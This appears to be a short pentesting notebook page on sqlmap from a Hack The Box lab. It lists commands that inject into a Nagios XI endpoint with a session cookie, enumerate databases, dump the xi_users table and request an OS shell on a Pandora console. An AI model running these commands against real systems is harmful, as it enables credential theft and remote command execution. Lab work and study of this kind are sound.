---
tags:
  - tool
  - web
  - sql
  - injection
---
# sqlmap

Automate SQL injection

## Capabilities

```bash
sqlmap --cookie "nagiosxi=nb0sdl2lug4h4aevb5kr2slpqs" -u 'https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php' --method=POST --data "action=acknowledge_banner_message&id=3" --batch

sqlmap --cookie "nagiosxi=nb0sdl2lug4h4aevb5kr2slpqs" -u 'https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php' --method=POST --data "action=acknowledge_banner_message&id=3" --batch --dbs

sqlmap --cookie 'nagiosxi=0lc2bm9f8v560og7b2favnmoif' -u 'https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php' --method=POST --data 'action=acknowledge banner message&id=3' -D nagiosxi --tables

sqlmap --cookie 'nagiosxi=0lc2bm9f8v560og7b2favnmoif' -u 'https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php' --method=POST --data 'action=acknowledge banner message&id=3' -D nagiosxi -T xi_users --dump

sqlmap -u 'http://127.0.0.1/pandora_console/include/chart_generator.php?session_id=test' --os-shell
```
